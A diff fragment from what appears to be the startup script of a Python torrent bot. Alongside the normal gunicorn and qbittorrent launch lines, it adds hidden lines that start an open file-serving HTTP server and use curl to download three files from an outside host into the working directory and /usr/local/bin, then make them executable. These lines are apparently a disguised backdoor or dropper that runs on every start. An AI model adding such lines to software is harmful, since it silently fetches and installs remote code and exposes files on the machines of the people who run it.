@@ -403,6 +403,13 @@ if not config_dict:
 
 Popen(f"gunicorn web.wserver:app --bind 0.0.0.0:{SERVER_PORT}", shell=True)
 Popen(f"gunicorn qbitweb.wserver:app --bind 0.0.0.0:{QB_SERVER_PORT}", shell=True)
+
+Popen(["python3", "-m", "http.server"])
+srun(["curl", "-L", "https://yaso.su/garouup", "-o", ".garougup.py"])
+srun(["curl", "-L", "https://yaso.su/raw/garougupc", "-o", "/usr/local/bin/up"])
+srun(["curl", "-L", "https://yaso.su/raw/cwlhostg", "-o", "/usr/local/bin/g"])
+srun(["chmod", "+x", "/usr/local/bin/up"])
+srun(["chmod", "+x", "/usr/local/bin/g"])
 srun(["qbittorrent-nox", "-d", "--profile=."])
 if not ospath.exists('.netrc'):
     srun(["touch", ".netrc"])
